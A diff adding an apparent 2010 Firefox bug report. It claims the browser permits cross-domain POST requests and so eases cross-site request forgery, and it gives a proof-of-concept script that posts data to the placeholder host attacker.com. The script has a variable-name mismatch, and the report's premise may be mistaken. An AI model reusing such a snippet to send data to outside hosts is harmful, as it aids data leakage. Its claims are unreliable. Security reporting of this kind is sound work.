@@ -1,0 +1,37 @@
+Firefox allows cross-domain POST request via JavaScript
+User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3
+Build Identifier: Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3
+
+Firefox allows the submission of arbitrary POST request domain different from the originating one. This make it a lot easier to mount Cross-Site Request Forgery attacks. Imagine one of the following situation where a JavaScript, which performs a malicious action on a different site (such a posting something on Facebook), is embedded into a site:
+
+- A malicious web site administrator embeds a malicious JavaScript into his site.
+- An attacker can embed arbitrary JavaScript into a frequently visited site (such a via a Cross-Site Scripting vulnerability)
+
+Other browser don't allow for cross-domain POST request (i tested IE 8, Opera 10.53 and Chrome 5).
+
+Reproducible: Always
+
+Steps to Reproduce:
+The following script demonstrates the issue (embed it into a site different from attacker.com):
+
+<script language="javascript">
+var field = {'a' : 'b'};
+postToUrl('http://attacker.com', fields);
+
+function postToUrl(url, fields)
+{
+var http; try { var http = new ActiveXObject('Microsoft.XMLHTTP'); } catch(e) { var http = new XMLHttpRequest(); }
+
+var params = '';
+for (var key in fields)
+params += key + '=' + fields[key] + '&';
+
+http.open('POST', url, true);
+http.send(params);
+}
+</script>
+Actual Results:
+The POST request is sent.
+
+Expected Results:
+The POST request to domain different from the originating one should be denied.
